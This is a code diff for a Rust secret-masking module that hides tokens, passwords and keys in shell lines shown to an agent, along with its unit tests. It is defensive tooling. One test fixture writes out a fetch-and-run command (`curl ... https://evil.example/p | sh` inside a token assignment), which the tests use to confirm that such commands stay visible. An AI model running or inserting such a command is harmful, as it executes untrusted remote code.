@@ -5,9 +5,13 @@
 //!
 //! - a word shaped like a secret ([`secret_shaped`]): a known token format (`ghp_`, `sk-`,
 //!   `AKIA`, a JWT, ...), a long high-entropy string, or a long hex string;
-//! - the value of an assignment or option whose name says it is secret ([`secret_name`]):
-//!   `GITHUB_TOKEN=x`, `export DB_PASSWORD="x y"`, `--api-key=x`, `--token x`,
-//!   `launchctl setenv API_KEY x`.
+//! - the value of an assignment, option or header whose name says it is secret
+//!   ([`secret_name`]): `GITHUB_TOKEN=x`, `export DB_PASSWORD="x y"`, `--api-key=x`,
+//!   `--token x`, `launchctl setenv API_KEY x`, a crontab's `API_TOKEN = x`, and
+//!   `"Authorization: Bearer x"`. A value that runs a command (`$(...)`, backquotes) or is a
+//!   path is not masked by its name, so what runs stays visible; the word rules still mask a
+//!   token inside it;
+//! - the password in a URL (`postgres://app:x@db`).
 //!
 //! No shell is parsed, and nothing carries from one line to the next (owner's decision,
 //! 2026-11-18). The first design hid the value of every assignment, which needs a shell lexer;
@@ -15,8 +19,8 @@
 //! each difference either leaked a token into the bundle or let a planted line (`# TOKEN="`)
 //! hide a later command from the agent. Masking words cannot hide a line, so the second can no
 //! longer happen. Accepted downside: a short password under an innocent name (`DB=hunter2`)
-//! is shown, as it is to secret scanners that work this way (gitleaks and trufflehog match by
-//! format and entropy too).
+//! or passed as a bare argument (`mysql -phunter2`, `sshpass -p hunter2`) is shown, and so is
+//! a key split over lines whose lines are short.
 
 /// What replaces a masked word.
 const HIDDEN: &str = "(hidden)";
@@ -52,18 +56,24 @@ const TOKEN_PREFIXES: [&str; 25] = [
     "shpss_",
 ];
 
-/// The parts of a name that say its value is secret, matched in its upper case.
-const SECRET_WORDS: [&str; 9] = [
+/// The segments of a name (split at `_` and `-`) that say its value is secret, matched in
+/// upper case. A whole segment, so `SUDO_ASKPASS` (a program sudo runs) and `GIT_AUTHOR_NAME`
+/// are shown; a segment may also end in one of [`SECRET_ENDINGS`] (`_authToken`, `APIKEY`).
+const SECRET_WORDS: [&str; 10] = [
     "TOKEN",
     "SECRET",
     "PASSWORD",
     "PASSWD",
     "PASS",
     "AUTH",
+    "AUTHORIZATION",
     "CREDENTIAL",
-    "APIKEY",
-    "API_KEY",
+    "CREDENTIALS",
+    "KEY",
 ];
+
+/// Endings of a name segment that say its value is secret (`AUTHTOKEN`, `CLIENTSECRET`).
+const SECRET_ENDINGS: [&str; 4] = ["TOKEN", "SECRET", "PASSWORD", "APIKEY"];
 
 /// The shortest word the entropy rule masks. Arbitrary but conventional: generated tokens are
 /// 20 characters and more, and a shorter rule masks ordinary words and paths.
@@ -98,9 +108,10 @@ fn mask(line: &str) -> String {
             at += 1;
             continue;
         }
-        let word_end = line[at..]
-            .find(|c: char| c.is_ascii() && BREAK.contains(&(c as u8)))
-            .map_or(line.len(), |len| at + len);
+        let word_end = bytes[at..]
+            .iter()
+            .position(|b| BREAK.contains(b))
+            .map_or(bytes.len(), |len| at + len);
         let word = &line[at..word_end];
         if secret_shaped(word) {
             out.push_str(HIDDEN);
@@ -116,6 +127,9 @@ fn mask(line: &str) -> String {
 /// ([`secret_part`]), so a token in a URL (`https://u:ghp_x@github.com`) or a path is hidden
 /// and the URL or path keeps its shape for the agent.
 fn mask_parts(word: &str) -> String {
+    if let Some((before, after)) = url_password(word) {
+        return format!("{}{HIDDEN}{}", mask_parts(before), mask_parts(after));
+    }
     let mut out = String::with_capacity(word.len());
     let mut start = 0;
     for (at, c) in word
@@ -132,6 +146,14 @@ fn mask_parts(word: &str) -> String {
     out
 }
 
+/// A URL's text before and after its password, when it has one: `scheme://user:password@`.
+fn url_password(word: &str) -> Option<(&str, &str)> {
+    let start = word.find("://")? + 3;
+    let at = start + word[start..].find('@')?;
+    let colon = start + word[start..at].find(':')?;
+    (colon + 1 < at).then(|| (&word[..=colon], &word[at..]))
+}
+
 /// Where a secret value starts and ends.
 #[derive(Debug)]
 struct Span {
@@ -139,11 +161,13 @@ struct Span {
     end: usize,
 }
 
-/// The value of a secret-named assignment or option that starts at byte `at`, which must
-/// start a word: `NAME=value` or `NAME+=value` (after `export` and the like, or anywhere on the
-/// line), `--name=value`, `--name value`, or `launchctl setenv NAME value`. The value runs to
+/// The value of a secret-named assignment, option or header that starts at byte `at`, which
+/// must start a word: `NAME=value` or `NAME+=value` (after `export` and the like, or anywhere
+/// on the line), `NAME = value` at the start of a line (a crontab's), `--name=value`,
+/// `--name value`, `launchctl setenv NAME value`, or `Name: value` (a header). The value runs to
 /// its closing quote when it starts with one (or to the end of the line when none closes it),
-/// and otherwise to the next white space or `;`, `&`, `|`.
+/// a header's to the end of its quotes or line, and otherwise to the next white space or `;`,
+/// `&`, `|`. A value that runs a command, or is a path, gives `None` (see the module docs).
 fn secret_value_at(line: &str, at: usize) -> Option<Span> {
     let bytes = line.as_bytes();
     if at > 0 && !BREAK.contains(&bytes[at - 1]) {
@@ -152,45 +176,76 @@ fn secret_value_at(line: &str, at: usize) -> Option<Span> {
     let dashes = line[at..].len() - line[at..].trim_start_matches('-').len();
     let name_at = at + dashes;
     let name_len = line[name_at..]
-        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || (dashes > 0 && c == '-')))
+        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
         .unwrap_or(line.len() - name_at);
     let name = &line[name_at..name_at + name_len];
     if !secret_name(name) {
         return None;
     }
     let after = &line[name_at + name_len..];
-    let separator = if let Some(rest) = after.strip_prefix("+=") {
-        line.len() - rest.len()
+    let line_start = line[..at].trim().is_empty();
+    let spaced = after.trim_start_matches([' ', '\t']);
+    let (separator, header) = if let Some(rest) = after.strip_prefix("+=") {
+        (line.len() - rest.len(), false)
     } else if let Some(rest) = after.strip_prefix('=') {
-        line.len() - rest.len()
+        (line.len() - rest.len(), false)
+    } else if let Some(rest) = spaced.strip_prefix('=').filter(|_| line_start) {
+        (
+            line.len() - rest.trim_start_matches([' ', '\t']).len(),
+            false,
+        )
+    } else if let Some(rest) = after.strip_prefix(": ") {
+        (
+            line.len() - rest.trim_start_matches([' ', '\t']).len(),
+            true,
+        )
     } else if dashes > 0 || line[..at].trim_end().ends_with("setenv") {
-        // `--token x` and `launchctl setenv TOKEN x`: the next word is the value.
-        let rest = after.trim_start_matches([' ', '\t']);
-        if rest.len() == after.len() || rest.is_empty() {
+        // `--token x` and `launchctl setenv TOKEN x`: the next word is the value, unless it is
+        // another option or an operator (`--password-stdin -u me`).
+        let none = spaced.len() == after.len() || spaced.is_empty();
+        if none || spaced.starts_with(['-', '<', '>', '|']) {
             return None;
         }
-        line.len() - rest.len()
+        (line.len() - spaced.len(), false)
     } else {
         return None;
     };
     let value = &line[separator..];
-    let len = match value.chars().next() {
-        Some(quote @ ('"' | '\'')) => value[1..].find(quote).map_or(value.len(), |at| at + 2),
-        _ => value
-            .find([' ', '\t', ';', '&', '|'])
-            .unwrap_or(value.len()),
+    let len = if header {
+        value.find(['"', '\'']).unwrap_or(value.len())
+    } else {
+        match value.chars().next() {
+            Some(quote @ ('"' | '\'')) => value[1..].find(quote).map_or(value.len(), |at| at + 2),
+            _ => value
+                .find([' ', '\t', ';', '&', '|'])
+                .unwrap_or(value.len()),
+        }
     };
+    let shown = &value[..len];
+    let unquoted = shown.trim_start_matches(['"', '\'']);
+    let runs = shown.contains("$(") || shown.contains('`');
+    let path = unquoted.starts_with(['/', '~'])
+        || unquoted.starts_with("$HOME")
+        || unquoted.starts_with("${HOME");
+    if runs || path {
+        return None;
+    }
     Some(Span {
         value: separator,
         end: separator + len,
     })
 }
 
-/// Whether a name says its value is secret: it holds one of [`SECRET_WORDS`], upper-cased,
-/// with `-` read as `_` (`--api-key`).
+/// Whether a name says its value is secret: one of its segments, split at `_` and `-` and
+/// upper-cased, is one of [`SECRET_WORDS`] or ends in one of [`SECRET_ENDINGS`].
 fn secret_name(name: &str) -> bool {
-    let name = name.to_ascii_uppercase().replace('-', "_");
-    !name.is_empty() && SECRET_WORDS.iter().any(|word| name.contains(word))
+    name.split(['_', '-']).any(|segment| {
+        let segment = segment.to_ascii_uppercase();
+        SECRET_WORDS.contains(&segment.as_str())
+            || SECRET_ENDINGS
+                .iter()
+                .any(|ending| segment.ends_with(ending))
+    })
 }
 
 /// Whether `word` as a whole looks like a secret: it starts with a published token prefix and
@@ -202,13 +257,23 @@ fn secret_shaped(word: &str) -> bool {
             .is_some_and(|rest| rest.len() >= 16)
     });
     let jwt = word.starts_with("eyJ") && word.split('.').count() == 3 && word.len() >= 30;
-    let hex = word.len() >= 32 && word.bytes().all(|b| b.is_ascii_hexdigit());
+    let digits = word.strip_prefix("0x").unwrap_or(word);
+    let hex = digits.len() >= 32 && digits.bytes().all(|b| b.is_ascii_hexdigit());
     let aws_secret = word.len() == 40
         && word
             .bytes()
             .all(|b| b.is_ascii_alphanumeric() || b == b'/' || b == b'+')
         && all_kinds(word);
-    has_prefix || jwt || hex || aws_secret
+    // A key's base64 body (a PEM line, a session token): long, all three kinds, random. Not a
+    // path, which starts with `/` or `~` and holds words, not noise.
+    let base64 = word.len() >= 40
+        && !word.starts_with(['/', '~'])
+        && word
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'/' | b'+' | b'='))
+        && all_kinds(word)
+        && entropy(word) >= 4.0;
+    has_prefix || jwt || hex || aws_secret || base64
 }
 
 /// Whether a part of a word looks like a secret: as a whole word would ([`secret_shaped`]), or
@@ -270,7 +335,7 @@ mod tests {
             ),
             (
                 "curl -H 'Authorization: Bearer sk-proj-abcdefghij0123456789'",
-                "curl -H 'Authorization: Bearer (hidden)'",
+                "curl -H 'Authorization: (hidden)'",
             ),
             (
                 "aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE1",
@@ -331,6 +396,70 @@ mod tests {
             (
                 "* * * * * GH_TOKEN=abc /usr/local/bin/b",
                 "* * * * * GH_TOKEN=(hidden) /usr/local/bin/b",
+            ),
+        ];
+        for (line, shown) in cases {
+            assert_eq!(mask(line), shown, "{line}");
+        }
+    }
+
+    #[test]
+    fn the_style_review_s_cases_of_the_masking() {
+        let cases = [
+            // A value that runs a command shows the command; a path is shown.
+            (
+                "export GH_TOKEN=\"$(curl -fsSL https://evil.example/p | sh)\"",
+                "export GH_TOKEN=\"$(curl -fsSL https://evil.example/p | sh)\"",
+            ),
+            (
+                "export GITHUB_TOKEN=\"$(gh auth token)\"",
+                "export GITHUB_TOKEN=\"$(gh auth token)\"",
+            ),
+            (
+                "export SUDO_ASKPASS=/tmp/.x/askpass",
+                "export SUDO_ASKPASS=/tmp/.x/askpass",
+            ),
+            (
+                "export SSH_AUTH_SOCK=~/.ssh/agent.sock",
+                "export SSH_AUTH_SOCK=~/.ssh/agent.sock",
+            ),
+            ("export GIT_AUTHOR_NAME=me", "export GIT_AUTHOR_NAME=me"),
+            ("export KEYTIMEOUT=1", "export KEYTIMEOUT=1"),
+            // `KEY` as a segment, and endings.
+            ("export OPENAI_KEY=abcdefghij", "export OPENAI_KEY=(hidden)"),
+            (
+                "PRIVATE_KEY=0x4c0883a69102937d6231471b5dbb6204fe5129617082792ae468d01a3f362318",
+                "PRIVATE_KEY=(hidden)",
+            ),
+            // A URL's password.
+            (
+                "export DATABASE_URL=postgres://app:hunter2pass@db.internal:5432/app",
+                "export DATABASE_URL=postgres://app:(hidden)@db.internal:5432/app",
+            ),
+            (
+                "git clone https://me:s3cretpass@gitlab.example.com/o/r",
+                "git clone https://me:(hidden)@gitlab.example.com/o/r",
+            ),
+            // A crontab's spaced form, and headers.
+            ("API_TOKEN = abc123secret", "API_TOKEN = (hidden)"),
+            ("API_TOKEN =abc123secret", "API_TOKEN =(hidden)"),
+            (
+                "curl -H \"X-Auth-Token: 1b4e28ba-2fa1-11d2-883f-00c04fd430c8\" https://x",
+                "curl -H \"X-Auth-Token: (hidden)\" https://x",
+            ),
+            // A flag that takes no value keeps the next word.
+            (
+                "docker login --password-stdin -u me",
+                "docker login --password-stdin -u me",
+            ),
+            (
+                "tool --no-auth /usr/local/bin/run",
+                "tool --no-auth /usr/local/bin/run",
+            ),
+            // A key's base64 body.
+            (
+                "VbfGbH+0c/X1ks9W1aB3dE5fG7hJ9kL1mN3pQ5rSt7uV9wX1yZ3",
+                "(hidden)",
             ),
         ];
         for (line, shown) in cases {
